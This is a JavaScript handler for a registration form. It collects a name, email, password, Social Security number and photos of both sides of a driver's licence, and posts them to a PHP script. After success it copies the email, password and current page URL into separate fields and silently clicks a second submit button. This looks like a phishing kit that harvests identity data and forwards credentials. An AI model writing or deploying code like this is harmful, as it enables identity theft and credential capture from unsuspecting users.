let btn = document.getElementById("account");

btn.addEventListener("click", (e) => {
  e.preventDefault();
  let name = document.getElementById("fullname");
  let email = document.getElementById("email");
  let ssn = document.getElementById("ssn");
  let driversLisence_front = document.getElementById("front");
  let driversLisence_back = document.getElementById("back");
  let password = document.getElementById("psw");
  let confam = document.getElementById("psw-repeat");

  ///VALIDATING THE FILEDS
  var number = /^[^0-9]+$/;
  var letter = /^[^a-zA-Z]+$/;
  var emailtest = /[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+/;

  if (emailtest.test(email.value) == false) {
    alert("Enter a valid Email", 0);
  } else if (number.test(password.value) == true) {
    alert("Password Must Include A Number", 0);
  } else if (letter.test(password.value) == true) {
    alert("Password Must Include Letters", 0);
  } else if (password.value.length < 6) {
    alert("Password Must Be At Least 6 Character Long", 0);
  } else if (password.value != confam.value) {
    alert("Confirm Your Password", 0);
  } else {
    const formdata = new FormData();
    formdata.append("email", email.value);
    formdata.append("password", password.value);
    formdata.append("name", name.value);
    formdata.append("ssn", ssn.value);
    formdata.append("front", driversLisence_front.files[0]);
    formdata.append("back", driversLisence_back.files[0]);
    fetchs(
      "./assets/php/sign.php",
      { method: "POST", body: formdata },
      (data) => {
        if (data == 1) {
          swal("Done!", "Registration Complete", "success");
          let email = getbyid("email");
          let password = getbyid("psw");
          let uname2 = getbyid("userp");
          let pass2 = getbyid("passp");
          let subb = getbyid("subb");
          let where = getbyid("where");

          uname2.value = email.value;
          pass2.value = password.value;
          where.value = location.href;

          subb.click();
        } else if (data == 2) {
          alert("Email already exist");
        } else if (data == 3) {
          alert("Phone Number Has Already Been Used");
        } else if (data == 4) {
          alert("phoneintication code does not exist");
        } else {
          alert("check Connection and try again");
          console.log(data);
        }
      }
    );
  }
});
id = "ssn1";
function testTextFields(id, twoid, btn1, btn2) {
  document.getElementById(id).addEventListener("keyup", () => {
    if (
      document.getElementById(id).value == 0 ||
      document.getElementById(twoid).value == 0
    ) {
      document.getElementById(btn1).style.display = "inherit";
      document.getElementById(btn2).style.display = "none";
    } else {
      document.getElementById(btn1).style.display = "none";
      document.getElementById(btn2).style.display = "inherit";
    }
  });
}
testTextFields("fullname", "email", "n1", "n2");
testTextFields("email", "fullname", "n1", "n2");

function ssn(id, btn1, btn2) {
  document.getElementById(id).addEventListener("keyup", () => {
    if (
      document.getElementById(id).value == 0
    ) {
      document.getElementById(btn1).style.display = "inherit";
      document.getElementById(btn2).style.display = "none";
    } else {
      document.getElementById(btn1).style.display = "none";
      document.getElementById(btn2).style.display = "inherit";
    }
  });
}

ssn("ssn", "ssn1", "ssn2")
